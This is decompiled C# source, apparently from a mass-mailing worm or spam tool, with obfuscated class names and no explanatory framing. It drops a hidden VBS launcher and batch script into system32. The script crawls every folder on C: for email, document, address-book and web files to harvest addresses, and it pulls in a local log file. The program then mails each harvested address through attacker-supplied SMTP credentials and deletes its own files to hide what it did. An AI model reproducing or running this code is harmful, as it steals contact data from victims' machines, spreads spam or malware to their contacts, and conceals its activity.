using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using Microsoft.VisualBasic.CompilerServices;
using ns2;

namespace ns1;

internal sealed class Class6
{
	public static void smethod_0()
	{
		string address = "" + Class2.smethod_2().method_0().vmethod_23()
			.get_Text();
		string subject = "" + Class2.smethod_2().method_0().vmethod_25()
			.get_Text();
		string body = "" + Class2.smethod_2().method_0().vmethod_29()
			.get_Text();
		string userName = "" + Class2.smethod_2().method_0().vmethod_7()
			.get_Text();
		string host = "" + Class2.smethod_2().method_0().vmethod_15()
			.get_Text();
		string string_ = "" + Class2.smethod_2().method_0().vmethod_11()
			.get_Text();
		FileStream stream = new FileStream("C:\\windows\\system32\\launchhh.vbs", FileMode.Create, FileAccess.Write);
		StreamWriter streamWriter = new StreamWriter(stream);
		streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
		streamWriter.WriteLine("Dim oShell");
		streamWriter.WriteLine("Set oShell = WScript.CreateObject (\"WScript.Shell\")");
		streamWriter.WriteLine("oShell.run \"C:\\windows\\system32\\launchhh.bat\",0,True");
		streamWriter.WriteLine("Set oShell = Nothing ");
		streamWriter.Close();
		Class7.Sleep(95000L);
		FileStream stream2 = new FileStream("C:\\windows\\system32\\launchhh.bat", FileMode.Create, FileAccess.Write);
		StreamWriter streamWriter2 = new StreamWriter(stream2);
		streamWriter2.WriteLine("dir /s /ad /b C:\\* >%windir%\\tmp.log");
		streamWriter2.WriteLine("for /F %%T in (%windir%\\tmp.log) do (");
		streamWriter2.WriteLine("for %%g in (%%T\\*.html) do (");
		streamWriter2.WriteLine("if exist %%T\\*.html (");
		streamWriter2.WriteLine("extract -files %%g >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("ping localhost -n 17");
		streamWriter2.WriteLine("for %%o in (%%T\\*.doc) do (");
		streamWriter2.WriteLine("if exist %%T\\*.doc (");
		streamWriter2.WriteLine("extract -files %%o >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%j in (%%T\\*.htm) do (");
		streamWriter2.WriteLine("if exist %%T\\*.htm (");
		streamWriter2.WriteLine("extract -files %%j >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%k in (%%T\\*.php) do (");
		streamWriter2.WriteLine("if exist %%T\\*.php (");
		streamWriter2.WriteLine("extract -files %%k >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%l in (%%T\\*.txt) do (");
		streamWriter2.WriteLine("if exist %%T\\*.txt (");
		streamWriter2.WriteLine("extract -files %%l >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%m in (%%T\\*.dbx) do (");
		streamWriter2.WriteLine("if exist %%T\\*.dbx (");
		streamWriter2.WriteLine("extract -files %%m >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%s in (%%T\\*.wab) do (");
		streamWriter2.WriteLine("if exist %%T\\*.wab (");
		streamWriter2.WriteLine("extract -files %%s >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%u in (%%T\\*.mdx) do (");
		streamWriter2.WriteLine("if exist %%T\\*.dbx (");
		streamWriter2.WriteLine("extract -files %%u >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%i in (%%T\\*.cfg) do (");
		streamWriter2.WriteLine("if exist %%T\\*.cfg (");
		streamWriter2.WriteLine("extract -files %%i >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%q in (%%T\\*.mdx) do (");
		streamWriter2.WriteLine("if exist %%T\\*.mdx (");
		streamWriter2.WriteLine("extract -files %%q >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%y in (%%T\\*.html) do (");
		streamWriter2.WriteLine("if exist %%T\\*.html (");
		streamWriter2.WriteLine("extract -files %%y >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%d in (%%T\\*.rtf) do (");
		streamWriter2.WriteLine("if exist %%T\\*.rtf (");
		streamWriter2.WriteLine("extract -files %%d >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%x in (%%T\\*.log) do (");
		streamWriter2.WriteLine("if exist %%T\\*.log (");
		streamWriter2.WriteLine("extract -files %%x >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%g in (%%T\\*.dat) do (");
		streamWriter2.WriteLine("if exist %%T\\*.dat (");
		streamWriter2.WriteLine("extract -files %%g >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%p in (%%T\\*.css) do (");
		streamWriter2.WriteLine("if exist %%T\\*.css (");
		streamWriter2.WriteLine("extract -files %%p >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%b in (%%T\\*.xls) do (");
		streamWriter2.WriteLine("if exist %%T\\*.xls (");
		streamWriter2.WriteLine("extract -files %%b >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%c in (%%T\\*.xsl) do (");
		streamWriter2.WriteLine("if exist %%T\\*.xsl (");
		streamWriter2.WriteLine("extract -files %%c >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%f in (%%T\\*.xml) do (");
		streamWriter2.WriteLine("if exist %%T\\*.xml (");
		streamWriter2.WriteLine("extract -files %%f >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%r in (%%T\\*.uin) do (");
		streamWriter2.WriteLine("if exist %%T\\*.uin (");
		streamWriter2.WriteLine("extract -files %%r >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%a in (%%T\\*.msg) do (");
		streamWriter2.WriteLine("if exist %%T\\*.msg (");
		streamWriter2.WriteLine("extract -files %%a >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%d in (%%T\\*.mdb) do (");
		streamWriter2.WriteLine("if exist %%T\\*.mdb (");
		streamWriter2.WriteLine("extract -files %%d >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%a in (%%T\\*.dbb) do (");
		streamWriter2.WriteLine("if exist %%T\\*.dbb (");
		streamWriter2.WriteLine("extract -files %%a >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%q in (%%T\\*.pl) do (");
		streamWriter2.WriteLine("if exist %%T\\*.pl (");
		streamWriter2.WriteLine("extract -files %%q >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%e in (%%T\\*.eml) do (");
		streamWriter2.WriteLine("if exist %%T\\*.eml (");
		streamWriter2.WriteLine("extract -files %%e >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("for %%f in (%%T\\*.*ml) do (");
		streamWriter2.WriteLine("if exist %%T\\*.*ml (");
		streamWriter2.WriteLine("extract -files %%f >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine("echo dieteamcom@gmail.com >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %username%@gmail.com >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %username%@hotmail.com >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %username%@live.com >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %username%@hotmail.de >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %username%@live.de >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %username%@fbi.gov >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %username%@msn.com >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %username%@yahoo.com >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %computername%@gmail.com >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %computername%@hotmail.com >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %computername%@live.com >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %computername%@hotmail.de >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %computername%@live.de >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %computername%@fbi.gov >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %computername%@msn.com >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %computername%@yahoo.com >>%windir%\\ex.txt");
		streamWriter2.WriteLine("set /a ran=%random%%%25");
		streamWriter2.WriteLine("set username2=%username%%ran%");
		streamWriter2.WriteLine("echo %username2%@gmail.com >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %username2%@hotmail.com >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %username2%@live.com >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %username2%@hotmail.de >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %username2%@live.de >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %username2%@fbi.gov >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %username2%@msn.com >>%windir%\\ex.txt");
		streamWriter2.WriteLine("echo %username2%@yahoo.com >>%windir%\\ex.txt");
		streamWriter2.WriteLine("set /a ranz=%random%%%1005+1");
		streamWriter2.WriteLine("if %ranz%==10 (");
		streamWriter2.WriteLine("if exist C:\\WINDOWS\\system32\\logstm.txt (");
		streamWriter2.WriteLine("type C:\\WINDOWS\\system32\\logstm.txt >>%windir%\\ex.txt");
		streamWriter2.WriteLine(")");
		streamWriter2.WriteLine(")");
		streamWriter2.Close();
		Class7.Sleep(905000L);
		Process.Start("C:\\windows\\system32\\launchhh.vbs");
		Class7.Sleep(905000L);
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = Class7.smethod_1("C:\\windows\\ex.txt").GetEnumerator();
			while (enumerator.MoveNext())
			{
				string addresses = Conversions.ToString(enumerator.Current);
				try
				{
					MailMessage mailMessage = new MailMessage();
					mailMessage.From = new MailAddress(address);
					mailMessage.To.Add(addresses);
					mailMessage.Subject = subject;
					mailMessage.Body = body;
					SmtpClient smtpClient = new SmtpClient(host);
					smtpClient.Port = 25;
					smtpClient.Credentials = new NetworkCredential(userName, Class7.smethod_0(string_));
					smtpClient.EnableSsl = true;
					smtpClient.Send(mailMessage);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				(enumerator as IDisposable).Dispose();
			}
		}
		FileInfo fileInfo = new FileInfo("C:\\windows\\system32\\launchhh.vbs");
		fileInfo.Delete();
		FileInfo fileInfo2 = new FileInfo("C:\\windows\\system32\\launchhh.bat");
		fileInfo2.Delete();
		FileInfo fileInfo3 = new FileInfo("C:\\windows\\ex.txt");
		fileInfo3.Delete();
	}
}
